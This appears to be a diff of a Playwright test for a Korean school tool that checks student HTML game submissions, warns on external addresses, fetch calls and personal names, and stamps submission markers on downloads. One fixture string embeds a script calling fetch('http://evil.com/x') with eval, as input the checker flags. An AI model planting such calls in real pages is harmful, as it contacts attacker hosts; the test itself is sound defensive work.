@@ -71,6 +71,9 @@ with sync_playwright() as p:
     pg.screenshot(path=OUT+'t2_top.png',full_page=False)
     bad='<!DOCTYPE html><html><head><title>t</title><script src="https://cdn.x.com/a.js"></script></head><body>김하늘 20315 <script>fetch("http://evil.com/x");eval("1")</script></body></html>'
     pg.fill('#gcode',bad)
+    ok('게임 이름 없으면 내려받기 막힘',pg.is_disabled('#gdl') and '게임 이름' in pg.inner_text('#gwarn'))
+    pg.fill('#gtitle','김하늘 게임'); ok('이름에 내 이름 있으면 막힘',pg.is_disabled('#gdl'))
+    pg.fill('#gtitle','원소 짝꿍'); pg.fill('#gdesc','원소 카드를 짝지어요')
     w=pg.inner_text('#gwarn'); ok('점검: 외부주소/외부파일/API/이름 경고','외부 주소' in w and '외부 파일' in w and 'fetch' in w and '학번이나 이름' in w, w[:100].replace('\n',' | '))
     ok('경고 있어도 내려받기는 가능(교사가 최종 판단)',not pg.is_disabled('#gdl'))
     pg.fill('#gcode','<p>조각 코드</p>'); ok('전체 코드 아님 경고','전체가 아닌' in pg.inner_text('#gwarn'))
@@ -86,12 +89,13 @@ with sync_playwright() as p:
     with pg.expect_download() as d: pg.click('#gdl')
     dd=d.value; path=OUT+dd.suggested_filename; dd.save_as(path); txt=open(path,encoding='utf-8').read()
     ok('다운로드 파일 이름','20315_김하늘.html'==dd.suggested_filename,dd.suggested_filename)
-    ok('첫 줄 제출 표식',txt.startswith('<!-- vibe-submit:20315|김하늘 -->\n<!DOCTYPE html>'),txt[:60])
+    ok('첫 줄 제출 표식 + 게임 정보',txt.startswith('<!-- vibe-submit:20315|김하늘 -->\n<!-- vibe-info:') and '\n<!DOCTYPE html>' in txt[:300],txt[:120])
+    import urllib.parse as up; info=json.loads(up.unquote(txt.split('vibe-info:')[1].split(' -->')[0])); ok('게임 정보 내용',info=={'t':'원소 짝꿍','d':'원소 카드를 짝지어요'},str(info))
     # 재내보내기 시 표식 중복 방지
     pg.fill('#gcode',txt)
     with pg.expect_download() as d2: pg.click('#gdl')
     t2=d2.value; t2.save_as(OUT+'re.html'); r=open(OUT+'re.html',encoding='utf-8').read()
-    ok('표식 중복 없음',r.count('vibe-submit')==1)
+    ok('표식 중복 없음',r.count('vibe-submit')==1 and r.count('vibe-info')==1)
     # 2~3차시 요약
     pg.click("#t2 >> text=제출용 요약 복사"); pg.wait_for_timeout(300)
     clip=pg.evaluate('navigator.clipboard.readText()'); ok('2~3차시 요약에 표 포함','제작 일지' in clip and '피드백 카드' in clip and '불편했던 부분' in clip)
